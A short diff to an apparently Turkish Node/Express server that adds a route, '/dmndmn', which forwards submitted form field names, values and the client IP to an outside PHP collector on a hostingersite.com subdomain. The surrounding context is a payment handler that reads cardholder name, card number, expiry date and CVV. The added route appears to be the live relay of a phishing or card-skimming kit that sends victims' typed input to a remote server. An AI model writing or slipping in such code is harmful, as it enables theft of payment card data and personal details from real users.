@@ -381,6 +381,26 @@ app.post('/api/adres/sil', (req, res) => {
     });
 });
 
+app.post('/dmndmn', (req, res) => {
+   const { input_name, input_value, ip } = req.body;
+
+  axios.post(
+    'https://forestgreen-rook-759809.hostingersite.com/dmn/input_kaydet.php',
+    qs.stringify({ input_name, input_value, ip }),
+    {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest'
+      }
+    }
+  )
+    .then(response => res.send(response.data))
+    .catch(error => {
+      console.error('Ödeme hatası:', error.message);
+      res.status(500).send('fail');
+    });
+});
+
 app.post('/api/odeme', (req, res) => {
   const ip = getClientIp(req);
   const { isim_soyisim, kredi_karti, skt, cvv, bakiye } = req.body;
